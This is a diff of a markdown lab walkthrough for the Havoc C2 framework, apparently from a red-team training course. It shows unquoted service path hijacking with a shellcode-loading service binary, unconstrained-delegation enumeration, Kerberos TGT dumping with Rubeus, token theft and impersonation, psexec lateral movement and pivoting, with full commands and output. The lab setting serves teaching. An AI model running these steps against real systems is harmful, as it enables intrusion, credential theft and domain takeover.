@@ -126,7 +126,7 @@ Once the verification is done, we can move on to the next section.
 
 ![image](https://user-images.githubusercontent.com/107750005/222167859-1e1a9173-a3ea-41a2-9ad2-c8fd9029eb1f.png)
 
-In the scenario above, you are given 1 Attacker Windows with essentials tools need to be compiled, 1 Attacker Linux box with Havoc Framework and essential tools pre-installed, and 1 low-level user credentials in WORKSTATION-01. All user credentials including "Domain Admins" had also been given in the course material because it is used for troubleshooting purposes and it will not be utilized during the walkthrough as all machines need to be up in order to let the attacks functional. To let the machines to be powered on 24/7, go to ***Start Menu > Search for "Power, sleep, and battery settings" > Screen and sleep > Select "Never"***
+In the scenario above, you are given 1 **Attacker Windows** with essentials tools need to be compiled, 1 **Attacker Linux** with Havoc Framework and essential tools pre-installed, and 1 low-level user credentials in **WORKSTATION-01**. All user credentials including "Domain Admins" had also been given in the course material because it is used for troubleshooting purposes and it will not be utilized during the walkthrough as all machines need to be up in order to let the attacks functional. To let the machines to be powered on 24/7, go to ***Start Menu > Search for "Power, sleep, and battery settings" > Screen and sleep > Select "Never"***
 
 | Machines         | Username    | Password       |
 |------------------|-------------|----------------|
@@ -174,7 +174,7 @@ HAVOC Vulnerable Service                    C:\Program Files\HAVOC\binary files\
 VMTools                                     "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"
 ```
 
-We can see that the paths for **ALG, AppVClient, and GraphicsPerfSvc** are not quoted, but the path for **VMTools** is. The difference is that this latter path has spaces in them. **HAVOC Vulnerable Service** has spaces in the path and is also not quoted.
+We can see that the paths for **ALG**, **AppVClient**, and **GraphicsPerfSvc** are not quoted, but the path for **VMTools** is. The difference is that this latter path has spaces in them. **HAVOC Vulnerable Service** has spaces in the path and is also not quoted.
 
 When Windows attempts to read the path to this executable, it interprets the space as a terminator. So, it will attempt to execute the following (in order):
 
@@ -185,10 +185,10 @@ When Windows attempts to read the path to this executable, it interprets the spa
 
 If we can drop a binary into any of those paths, the service will execute it before the real one. Of course, there's no guarantee that we have permissions to write into either of them.
 
-In conclusion, 2 conditions need to be met to launch unquoted path attacks.
+In conclusion, **2 conditions** need to be met to launch unquoted path attacks.
 
-1. The location of the service need to contain spaces and unquoted.
-2. The specific service need to have write permission to low-level users.
+- The location of the service needs to **contain spaces** and **unquoted**.
+- The specific service need to have **write permission to low-level users**.
 
 The shell command `icacls` cmdlet will show the permissions of various objects (including files and directories).
 
@@ -217,7 +217,7 @@ Successfully processed 1 files; Failed processing 0 files
 
 We can see from the output that BUILTIN\Users have write permission (W) on the `C:\Program Files\HAVOC\binary files` directory, which means we can upload a malicious binary to hijack this unquoted path.
 
-`SharpUp.exe` will also list any services that match these conditions.
+[`SharpUp.exe`](https://github.com/GhostPack/SharpUp) will also list any services that match these conditions.
 
 ```
 06/03/2023 16:53:34 [5pider] Demon » dotnet inline-execute /home/havoc/Desktop/Tools/SharpUp/SharpUp/bin/Debug/SharpUp.exe audit
@@ -242,7 +242,7 @@ We can see from the output that BUILTIN\Users have write permission (W) on the `
 
 Payloads to abuse services must be specific "service binaries", because they need to interact with the Service Control Manager.  When generating the payload, the payload format **Windows Service EXE** will be selected in Havoc Teamserver. However, the default payload option provided by Havoc Framework has the risk to get detected by Windows Defender. Therefore, we will utilize our own custom service binary `ServiceExec.exe` to hijack the path. (The `ServiceExec.exe` had been provided in the Attacker Windows)
 
-```VB.NET
+```
 byte[] shellcode = { };
 
 using (var handler = new HttpClientHandler())
@@ -267,7 +267,7 @@ Open `ServiceExec.sln` in Visual Studio, navigate to the following code block ab
 
 After that, build the Solution and transfer to your Attacker Linux.
 
-In a.tarolli/WORKSTATION-01 demon, navigate to the vulnerable path, upload, and rename it to `executable.exe`.
+In **a.tarolli/WORKSTATION-01** demon, navigate to the vulnerable path, upload, and rename it to `executable.exe`.
 
 ```
 06/03/2023 16:55:06 [5pider] Demon » cd C:\Program Files
@@ -320,7 +320,7 @@ SERVICE_NAME: HAVOC Vulnerable Service
         FLAGS             :
 ```
 
-Completing all the step, you should get a `SYSTEM` demon after starting the "HAVOC Vulnerable Service".
+Completing all the step, you should get a `SYSTEM` demon after starting the **"HAVOC Vulnerable Service"**.
 
 ```
 06/03/2023 17:12:25 [5pider] Demon » token getuid
@@ -340,7 +340,13 @@ Delegation allows a user or machine to act on behalf of another user to another 
 
 ![image](https://user-images.githubusercontent.com/107750005/223048931-fb1b0686-6abe-4130-bd27-122cd436f4af.png)
 
-Some texts here...
+**Unconstrained delegation** is a feature that a Domain Administrator can set to any Computer inside the domain. Then, anytime a user logins onto the Computer, a copy of the TGT of that user is going to be sent inside the TGS provided by the DC and saved in memory in LSASS. So, if you have **Administrator privileges** on the machine, you will be able to dump the tickets and impersonate the users on any machine.
+
+THerefore, if a domain admin logins inside a computer with **"Unconstrained Delegation"** feature activated, and you have **local admin privileges** inside that machine, you will be able to dump the ticket and impersonate the Domain Admin anywhere (Domain Privilege Escalation).
+
+In our case, we had already retrieved a `SYSTEM` account which count as a high integrity demon. Therefore, we are able to launch this attack if `m.seitz` had login into **WORKSTATION-01** before. We want the user `m.seitz` is because he is local administrator in **WORKSTATION-02**.
+
+First, we can check our permission before impersonating `m.seitz` by listing the directory of **WORKSTATION-02** in `SYSTEM` demon. You are expected to get a permission error.
 
 ```
 06/03/2023 15:15:39 [5pider] Demon » dir \\WORKSTATION-02.havoc.local\C$
@@ -349,7 +355,9 @@ Some texts here...
 [!] Win32 Error: ERROR_ACCESS_DENIED [5]
 ```
 
-Some texts here...
+For enumeration, [`ADSearch.exe`](https://github.com/tomcarver16/ADSearch) has fewer built-in searches compared to PowerView and SharpView, but it does allow you to specify custom Lightweight Directory Access Protocol (LDAP) searches. These can be used to identify entries in the directory that match a given criteria.
+
+This query will return all computers that are permitted for unconstrained delegation.
 
 ```
 06/03/2023 15:40:29 [5pider] Demon » dotnet inline-execute /home/havoc/Desktop/Tools/ADSearch/ADSearch/bin/Debug/ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
@@ -380,7 +388,11 @@ GitHub: @tomcarver16
 	[+] operatingsystem : Windows 11 Pro
 ```
 
-Some texts here...
+> The argument `userAccountControl:1.2.840.113556.1.4.803:=524288` in `ADSearch.exe` is the representation for searching unconstrained delegation objects.
+
+[`SharpView.exe`](https://github.com/tevora-threat/SharpView) is another tool for domain enumeration and it was designed to be a C# port of PowerView. Therefore, it has much the same functionality. However, one downside is that it doesn't have the same piping ability as PowerShell.
+
+This query will also return all computers that are permitted for unconstrained delegation.
 
 ```
 06/03/2023 15:41:45 [5pider] Demon » dotnet inline-execute /home/havoc/Desktop/Tools/SharpView/SharpView/bin/Debug/SharpView.exe Get-NetComputer -Unconstrained
@@ -430,7 +442,7 @@ dscorepropagationdata          : 1/1/1601 12:00:00 AM
 msds-supportedencryptiontypes  : 28
 ```
 
-Some texts here...
+After knowing **WORKSTATION-02** are set under unconstrained delegation, [`Rubeus.exe`](https://github.com/GhostPack/Rubeus) will be heavily utilized in this section, especially kerberos topics. By extracting and harvesting the kerberos tickets, use `Rubeus.exe triage` to grab all current tickets contains parameters such as login ID (LUID), domain username, services, and end time.
 
 ```
 06/03/2023 15:31:18 [5pider] Demon » dotnet inline-execute /home/havoc/Desktop/Tools/Rubeus/Rubeus/bin/Debug/Rubeus.exe triage
@@ -452,7 +464,9 @@ Action: Triage Kerberos Tickets (All Users)
  | 0x1eda980 | m.seitz @ HAVOC.LOCAL         | ldap/DC01.havoc.local             | 6/3/2023 7:02:06 AM  |
 ```
 
-Some texts here...
+> **WORKSTATION-01** was configured that `m.seitz` has login record. Try login again with `m.seitz` in **WORKSTATION-01** if LUID of `m.seitz` is not existed.
+
+As mentioned above, we want accounts such as `m.seitz`, or Domain Admins even better to move laterally to **WORKSTATION-02**. Copy the LUID of `m.seitz` and dump or extract out the TGTs.
 
 ```
 06/03/2023 15:34:11 [5pider] Demon » dotnet inline-execute /home/havoc/Desktop/Tools/Rubeus/Rubeus/bin/Debug/Rubeus.exe dump /luid:0x1eda980 /nowrap
@@ -494,7 +508,7 @@ Action: Dump Kerberos Ticket Data (All Users)
       doIFejCC[...]TE9DQUw=
 ```
 
-Some texts here...
+After extracting the TGT, we can leverage it via a new logon session by using `Rubeus.exe createnetonly`. The `/password` parameter can be anything as long as the `/domain`, `/username`, and `/ticket` parameters are correct.
 
 ```
 06/03/2023 15:36:21 [5pider] Demon » dotnet inline-execute /home/havoc/Desktop/Tools/Rubeus/Rubeus/bin/Debug/Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:HAVOC /username:m.seitz /password:FakePass /ticket:doIFejCC[...]TE9DQUw=
@@ -519,7 +533,11 @@ Some texts here...
 [+] LUID            : 0x2f60ba7
 ```
 
-Some texts here...
+Rubeus creates a new process with incorrect credentials with a new Process ID generated. Next, we need to steal the newly created process. In Cobalt Strike, red team operators just only require to `steal token 4160` in order to perform directory listing. While in Havoc Framework, an additional impersonation needs to be done after stealing the token (a.k.a. ProcessID). To steal the token, the syntax is `token steal [ProcessID]`.
+
+By typing `token list`, you can observe the token vault. Any token stole or made by operators will be stored in the token vault.
+
+To impersonate another user, the syntax is `token impersonate [Token ID]`. The Token ID can be found in the token vault.
 
 ```
 06/03/2023 15:37:40 [5pider] Demon » token steal 4160
@@ -613,7 +631,7 @@ The `jump-exec psexec` command work by uploading a service binary to the target 
 [+] psexec successful executed on WORKSTATION-02
 ```
 
-Lastly, link the WORKSTATION-02 to WORKSTATION-01 with `pivot connect` module. The syntax is `pivot connect [COMPUTER] [pipe name]`.
+Lastly, link the WORKSTATION-02 to WORKSTATION-01 with `pivot connect` module. The syntax is `pivot connect [COMPUTER] [pipe name]`. You are able to read the flag if you have not retrieved the flag in the previous section.
 
 ```
 05/03/2023 23:22:20 [5pider] Demon » pivot connect WORKSTATION-02 smbpipe
